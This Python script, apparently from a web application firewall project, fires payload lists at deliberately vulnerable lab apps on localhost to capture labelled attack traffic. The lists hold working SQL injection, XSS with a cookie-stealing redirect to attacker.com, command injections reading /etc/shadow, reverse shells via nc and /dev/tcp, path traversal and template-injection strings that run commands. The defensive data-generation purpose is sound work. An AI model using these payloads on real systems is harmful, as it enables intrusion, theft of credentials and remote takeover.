"""
TransWAF - Attack Scenario Scripts
Pre-written attack payloads targeting DVWA, Juice Shop, and WebGoat.
Run these with the mitmproxy capture addon active to generate labeled data.

Requirements:
  pip install requests

Usage:
  # Terminal 1 — proxy
  mitmdump -s data/capture_traffic.py --listen-port 8080

  # Terminal 2 — attacks (proxied through mitmproxy)
  python data/attack_scenarios.py --target dvwa
  python data/attack_scenarios.py --target juiceshop
  python data/attack_scenarios.py --target webgoat
  python data/attack_scenarios.py --target all
"""

import sys
import argparse
import time
import requests
from loguru import logger

# Route all requests through mitmproxy so they're captured
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION = requests.Session()
SESSION.proxies = PROXIES
SESSION.verify = False  # mitmproxy uses self-signed cert

# ── Target URLs ───────────────────────────────────────────────────────────────

TARGETS = {
    "dvwa":       "http://localhost:8081",
    "juiceshop":  "http://localhost:3000",
    "webgoat":    "http://localhost:8888",
}


# ── SQLi Payloads ─────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT username,password,null FROM users--",
    "1; DROP TABLE users--",
    "' OR 1=1#",
    "admin'--",
    "1' AND SLEEP(3)--",
    "1' WAITFOR DELAY '0:0:3'--",
    "' AND 1=2 UNION SELECT table_name,null FROM information_schema.tables--",
    "' OR ''='",
    "1' ORDER BY 3--",
    "' GROUP BY username HAVING 1=1--",
    "1%27+OR+%271%27%3D%271",   # URL-encoded
    "1'+UNION+SELECT+null,password+FROM+users--",
]

# ── XSS Payloads ──────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<a href='javascript:void(0)' onclick='alert(1)'>click</a>",
    "<body onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "<%3Cscript%3Ealert(1)%3C/script%3E>",  # Double encoded
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

# ── CMDi Payloads ─────────────────────────────────────────────────────────────

CMDI_PAYLOADS = [
    "127.0.0.1; ls -la",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1 | whoami",
    "`id`",
    "$(whoami)",
    "127.0.0.1; cat /etc/shadow",
    "127.0.0.1 && uname -a",
    "127.0.0.1; nc -e /bin/sh attacker.com 4444",
    "127.0.0.1 | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "127.0.0.1%3Bls",  # URL-encoded semicolon
    "127.0.0.1%0aid",  # Newline injection
]

# ── Path Traversal Payloads ───────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "../../../../proc/self/environ",
    "..%c0%afetc%c0%afpasswd",  # Unicode slash
    "%252e%252e%252fetc%252fpasswd",  # Double URL-encode
]

# ── RCE/SSTI Payloads ─────────────────────────────────────────────────────────

RCE_PAYLOADS = [
    "{{7*7}}",
    "{{config}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${7*7}",
    "${7*'7'}",
    "<%= 7*7 %>",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${Runtime.getRuntime().exec('id')}",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
]

# ── Benign Requests ───────────────────────────────────────────────────────────

BENIGN_PATHS = [
    "/",
    "/index.php",
    "/about",
    "/login",
    "/products",
    "/search?q=laptop",
    "/search?q=electronics",
    "/user/profile",
    "/api/products",
    "/api/users/1",
    "/contact",
    "/news?category=tech",
    "/blog/post/1",
    "/?page=home&lang=en",
    "/shop?category=books&sort=price",
]


# ── Attack Scenario Functions ─────────────────────────────────────────────────

def attack_dvwa(base_url: str):
    """Send attack payloads against DVWA endpoints."""
    logger.info(f"Attacking DVWA at {base_url}")

    # Login first
    try:
        SESSION.get(f"{base_url}/setup.php", timeout=5)
        SESSION.post(f"{base_url}/login.php", data={
            "username": "admin", "password": "password", "Login": "Login"
        }, timeout=5)
        SESSION.get(f"{base_url}/security.php", timeout=5)
        SESSION.post(f"{base_url}/security.php", data={
            "security": "low", "seclev_submit": "Submit"
        }, timeout=5)
        logger.info("DVWA: Logged in, set security to LOW")
    except Exception as e:
        logger.warning(f"DVWA: Login failed: {e} — continuing without auth")

    # SQLi — DVWA SQL Injection page
    for payload in SQLI_PAYLOADS:
        try:
            SESSION.get(f"{base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # XSS (Reflected) — DVWA XSS page
    for payload in XSS_PAYLOADS:
        try:
            SESSION.get(f"{base_url}/vulnerabilities/xss_r/?name={payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Command Injection — DVWA ping page
    for payload in CMDI_PAYLOADS:
        try:
            SESSION.post(f"{base_url}/vulnerabilities/exec/", data={
                "ip": payload, "Submit": "Submit"
            }, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # File Inclusion (Path Traversal)
    for payload in PATH_TRAVERSAL_PAYLOADS:
        try:
            SESSION.get(f"{base_url}/vulnerabilities/fi/?page={payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Benign traffic
    for path in BENIGN_PATHS:
        try:
            SESSION.get(f"{base_url}{path}", timeout=5)
            time.sleep(0.05)
        except Exception: pass

    logger.info("DVWA: Attack scenarios complete")


def attack_juiceshop(base_url: str):
    """Send attack payloads against OWASP Juice Shop endpoints."""
    logger.info(f"Attacking Juice Shop at {base_url}")

    # SQLi — Login bypass and search
    for payload in SQLI_PAYLOADS:
        try:
            SESSION.post(f"{base_url}/rest/user/login", json={
                "email": f"' {payload} --", "password": "anything"
            }, timeout=5)
            SESSION.get(f"{base_url}/rest/products/search?q={payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # XSS — Product search, feedback
    for payload in XSS_PAYLOADS:
        try:
            SESSION.get(f"{base_url}/rest/products/search?q={payload}", timeout=5)
            SESSION.post(f"{base_url}/api/Feedbacks", json={
                "comment": payload, "rating": 1
            }, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Path traversal — profile image, file access
    for payload in PATH_TRAVERSAL_PAYLOADS:
        try:
            SESSION.get(f"{base_url}/assets/public/images/uploads/{payload}", timeout=5)
            SESSION.get(f"{base_url}/ftp/{payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # RCE — Template injection via review comments
    for payload in RCE_PAYLOADS:
        try:
            SESSION.post(f"{base_url}/api/Products/1/reviews", json={
                "message": payload, "author": "attacker"
            }, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Benign traffic
    for path in ["/", "/rest/products/search?q=apple", "/api/Products",
                 "/rest/basket/1", "/rest/user/whoami"]:
        try:
            SESSION.get(f"{base_url}{path}", timeout=5)
            time.sleep(0.05)
        except Exception: pass

    logger.info("Juice Shop: Attack scenarios complete")


def attack_webgoat(base_url: str):
    """Send attack payloads against WebGoat endpoints."""
    logger.info(f"Attacking WebGoat at {base_url}")

    base = f"{base_url}/WebGoat"

    # SQLi
    for payload in SQLI_PAYLOADS:
        try:
            SESSION.post(f"{base}/SqlInjection/attack5a", data={"account": payload}, timeout=5)
            SESSION.get(f"{base}/SqlInjection/attack1?query={payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # XSS
    for payload in XSS_PAYLOADS:
        try:
            SESSION.post(f"{base}/CrossSiteScripting/attack1", data={"username": payload}, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Path traversal
    for payload in PATH_TRAVERSAL_PAYLOADS:
        try:
            SESSION.get(f"{base}/PathTraversal/random-picture?id={payload}", timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Command injection
    for payload in CMDI_PAYLOADS:
        try:
            SESSION.post(f"{base}/injection/command", data={"ipAddress": payload}, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # SSTI/RCE
    for payload in RCE_PAYLOADS:
        try:
            SESSION.post(f"{base}/SSTI/attack", data={"text": payload}, timeout=5)
            time.sleep(0.1)
        except Exception: pass

    # Benign
    for path in ["/WebGoat/", "/WebGoat/start", "/WebGoat/welcome"]:
        try:
            SESSION.get(f"{base_url}{path}", timeout=5)
            time.sleep(0.05)
        except Exception: pass

    logger.info("WebGoat: Attack scenarios complete")


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser(description="TransWAF attack scenario runner")
    parser.add_argument(
        "--target", choices=["dvwa", "juiceshop", "webgoat", "all"],
        default="all", help="Target app to attack"
    )
    args = parser.parse_args()

    logger.info("=" * 60)
    logger.info("TransWAF Attack Scenario Runner")
    logger.info("All requests routed through mitmproxy (127.0.0.1:8080)")
    logger.info("=" * 60)

    if args.target in ("dvwa", "all"):
        attack_dvwa(TARGETS["dvwa"])

    if args.target in ("juiceshop", "all"):
        attack_juiceshop(TARGETS["juiceshop"])

    if args.target in ("webgoat", "all"):
        attack_webgoat(TARGETS["webgoat"])

    logger.info("\n[✓] All attack scenarios complete!")
    logger.info(f"[✓] Captured traffic saved to: data/raw/captured_traffic.csv")
    logger.info("[✓] Run: python data/preprocess.py --input data/raw/captured_traffic.csv --captured")
